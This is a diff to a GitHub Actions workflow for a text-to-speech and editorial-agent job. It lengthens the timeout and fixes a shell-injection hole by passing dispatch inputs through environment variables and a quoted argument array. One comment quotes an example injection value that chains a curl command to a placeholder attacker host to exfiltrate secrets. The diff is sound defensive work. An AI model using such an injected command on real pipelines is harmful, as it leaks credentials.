@@ -36,9 +36,17 @@ concurrency:
 jobs:
   run:
     runs-on: ubuntu-latest
-    # 60 minutes covers worst-case create (~30m) + status loop + process (~10m)
-    # plus install + preflight overhead. Beyond that the cycle is genuinely stuck.
-    timeout-minutes: 60
+    # Sized to outlast the inner TTS deadlines so the runner never kills the
+    # job mid-pipeline (which would skip _persist_team and strand the
+    # tts_batch_id, defeating the recovery story this workflow is built around):
+    #   tts_create_timeout_seconds:        1800s = 30m
+    #   tts_status_poll_timeout_seconds:   1800s = 30m  (Gemini state loop)
+    #   tts_process_timeout_seconds:        900s = 15m
+    #   ─────────────────────────────────  75m  TTS worst case
+    # + checkout / setup-python / pip install / preflight / agent calls
+    # ≈ 120m with comfortable headroom. If the cycle approaches this, the
+    # underlying inner timeouts have already failed soft and persisted state.
+    timeout-minutes: 120
     steps:
       - uses: actions/checkout@v4
 
@@ -72,14 +80,31 @@ jobs:
           TTS_BATCH_POLL_URL: ${{ secrets.TTS_BATCH_POLL_URL }}
           TTS_BATCH_FUNCTION_AUTH_TOKEN: ${{ secrets.TTS_BATCH_FUNCTION_AUTH_TOKEN }}
 
-          # Optional: voice + model overrides (defaults kick in when unset).
-          # Pin both via repo variables to keep cross-cycle audio consistent.
-          TTS_MODEL_NAME: ${{ vars.TTS_MODEL_NAME }}
-          TTS_VOICE_NAME: ${{ vars.TTS_VOICE_NAME }}
+          # workflow_dispatch inputs — passed through env so the shell never
+          # interpolates user-controlled strings into the script body. Without
+          # this, a dispatcher could submit `teams=NYJ; curl evil.com -d $...`
+          # and exfiltrate the secrets above. Inside `run:` we read these as
+          # ordinary $VARS and quote them when building the argv array.
+          TEAMS_INPUT: ${{ github.event.inputs.teams }}
+          LOOKBACK_INPUT: ${{ github.event.inputs.lookback_hours }}
+
+          # Repo-variable overrides (TTS_MODEL_NAME / TTS_VOICE_NAME and the
+          # OPENAI_MODEL_* set) are intentionally NOT in this env block.
+          # When a vars expression is unset, `${{ vars.X }}` expands to "",
+          # which pydantic-settings treats as an explicit override and would
+          # send model_name="" to Gemini (400). Each is exported below only
+          # when its value is non-empty.
         run: |
           set -euo pipefail
-          # Per-agent model overrides via repo variables — only export when
-          # set and non-empty (an empty model name is a 400 from OpenAI).
+          # Per-agent + TTS overrides via repo variables — only export when
+          # set and non-empty (an empty model/voice name is a 400 from the
+          # upstream API).
+          if [ -n "${{ vars.TTS_MODEL_NAME }}" ]; then
+            export TTS_MODEL_NAME="${{ vars.TTS_MODEL_NAME }}"
+          fi
+          if [ -n "${{ vars.TTS_VOICE_NAME }}" ]; then
+            export TTS_VOICE_NAME="${{ vars.TTS_VOICE_NAME }}"
+          fi
           if [ -n "${{ vars.OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT }}" ]; then
             export OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT="${{ vars.OPENAI_MODEL_TEAM_BEAT_REPORTER_AGENT }}"
           fi
@@ -90,16 +115,20 @@ jobs:
             export OPENAI_MODEL_ARTICLE_QUALITY_GATE_AGENT="${{ vars.OPENAI_MODEL_ARTICLE_QUALITY_GATE_AGENT }}"
           fi
 
-          TEAMS_ARG=""
-          if [ -n "${{ github.event.inputs.teams }}" ]; then
-            TEAMS_ARG="--teams ${{ github.event.inputs.teams }}"
+          # Build argv from env-passed inputs. Quoting "${args[@]}" preserves
+          # word boundaries even if someone managed to smuggle whitespace into
+          # an input — they'd just see argparse reject the value, not get
+          # arbitrary shell execution with the secrets above.
+          args=()
+          if [ -n "${TEAMS_INPUT:-}" ]; then
+            args+=(--teams "$TEAMS_INPUT")
           fi
-          LOOKBACK_ARG="--lookback-hours ${{ github.event.inputs.lookback_hours || '12' }}"
+          args+=(--lookback-hours "${LOOKBACK_INPUT:-12}")
 
           mkdir -p var
           # Tee stdout+stderr so the artifact captures both the cycle summary
           # line and any per-team agent error traces.
-          editorial-cycle beat $TEAMS_ARG $LOOKBACK_ARG 2>&1 | tee var/team-beat.log
+          editorial-cycle beat "${args[@]}" 2>&1 | tee var/team-beat.log
 
       - name: Upload cycle log
         if: always()
